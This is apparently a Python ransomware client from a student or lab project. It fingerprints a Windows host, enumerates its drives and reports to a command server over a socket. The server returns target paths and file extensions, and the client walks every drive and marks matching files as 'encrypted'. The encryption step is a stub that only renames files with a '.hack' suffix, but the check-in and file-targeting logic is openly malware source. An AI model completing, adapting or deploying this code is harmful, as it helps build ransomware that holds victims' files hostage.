import json
import os
import socket
import string
from time import time
from hashlib import sha256
from platform import node, win32_edition, system
from re import search
from os import path
import utile.config as config
import utile.message as message
from utile.network import *


LAST_STATE = None
IP_FRONTAL = ''
PORT_FRONTAL = 0

def initialize():
    global LAST_STATE

    hash_i = config.get_data_config("HASH")
    if hash_i is None:
        hash_i = hash_host_now()
        config.set_config('HASH', hash_i)
        config.save_config('configs/ransomware.json', 'configs/ransomware.key')

    os = os_type()
    if os is None:
        exit(-1)

    disks = list_disks()
    msg = message.get_message('initialize_req', [hash_i, os, disks])
    config.set_config('OS', os)
    config.set_config('DISKS', disks)
    config.save_config('ransomware/configs/ransomware.json', 'ransomware/configs/ransomware.key')

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((IP_FRONTAL, PORT_FRONTAL))
    send_msg_clear(s, msg)
    msg = recv_msg_clear(s)
    msg_type = message.get_message_type(msg)
    msg = json.loads(msg)
    if msg_type == 'INITIALIZE_RESP':
        s.close()

        config.set_config('ID_DB', msg['CONFIGURE'])
        config.set_config('DISKS', msg['SETTING']['DISKS'])
        config.set_config('PATHS', msg['SETTING']['PATHS'])
        config.set_config('FILE_EXT', msg['SETTING']['FILE_EXIT'])
        config.set_config('FREQ', msg['SETTING']['FREQ'])
        config.set_config('LAST_STATE', 'INITIALIZE')
        config.save_config('ransomware/configs/ransomware.json', 'ransomware/configs/ransomware.key')

        LAST_STATE = 'INITIALIZE'

def attaque():
    state = config.get_data_config('LAST_STATE')
    if state != 'INITIALIZE' and state != 'CRYPT' and state != 'PENDING':
        return None

    disks = config.get_data_config('DISKS')
    paths = config.get_data_config('PATHS')
    f_ext = config.get_data_config('FILE_EXT')
    nb_file_encrypted = config.get_data_config('NB_FILES_ENCRYPTED')
    if nb_file_encrypted == "None":
        nb_file_encrypted = 0

    for disk in disks:
        os.chdir(disk)
        for folders in paths:
            for (r, d, f) in os.walk(folders):
                for names in f:
                    if os.path.splitext(names)[1] in f_ext:
                        nb_file_encrypted += chiffre(f'{r}\{names}')
    print(f"{str(nb_file_encrypted)} fichiers chiffrés.")
def chiffre(cible):
    os.rename(f'{cible}', f'{cible}.hack')
    return 1

def hash_host_now():
    identifiant = f'{node()}{time()}'
    print(identifiant)
    return sha256(bytes()).hexdigest()


def os_type():
    if search("[Ww]indows", system()):
        if search("[Ss]erver", win32_edition()):
            return "SERVER"
        else:
            return "WORKSTATION"
    return None


def list_disks():
    dl = string.ascii_uppercase
    disks = ''
    for d in dl:
        if path.exists('%s:' % d):
            if disks != '':
                disks += ','
            disks += f'{d}:'
    return disks


def main():
    global IP_FRONTAL
    global PORT_FRONTAL
    config.load_config('ransomware/configs/ransomware.json', 'ransomware/configs/ransomware.key')
    IP_FRONTAL = config.get_data_config('IP_FRONTAL')
    PORT_FRONTAL = config.get_data_config('PORT_FRONTAL')
    LAST_STATE = config.get_data_config('LAST_STATE')
    if LAST_STATE == 'None':
        initialize()

    if LAST_STATE == 'INITIALIZE' or LAST_STATE == 'CRYPT' or LAST_STATE == 'PENDING':
        attaque()
